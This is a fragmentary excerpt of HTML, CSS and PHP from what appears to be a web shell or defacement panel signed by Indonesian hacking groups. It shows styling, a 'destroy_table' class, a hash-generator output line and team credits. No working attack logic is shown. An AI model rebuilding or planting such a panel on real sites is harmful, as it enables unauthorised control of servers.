...
<link rel="shortcut icon" href="https://goodimg.io/images/2024/06/27/game.gacor.jpeg"/>
...
body {
	background: url(https://goodimg.io/images/2024/06/27/game.gacor.jpeg) no-repeat center center fixed; 
...
<meta charset="UTF-8"> <meta name="Author" content="Zildan-Sec" /> <meta name="copyright" content="|I<3U|" /<meta name="description" content="SAYA ADALAH PATNER AVATAR TERKUAT DI BUMI!!" />
</head>
<style>
...
.destroy_table {;
  ...
  background-color: #000000;
            background-image: url(https://i.gifer.com/RoZ8.gif);
...
echo "</div>";
 ...
 echo 'Sha1 with Salt & MD5: <input class=inputz type=text size=50 value='.$hash1_sha1_double.'></center></table>';
   ...
   <p style='color: white;'>Team: JawaBaratCyber - <font color="red">SAYA ADALAH PATNER AVATAR TERKUAT DI BUMI!!</font> - Indonrsian error system - JavaCyberArmy - Dan lain lain</p>
   </center>
   </td>
   </tr>
   <?php
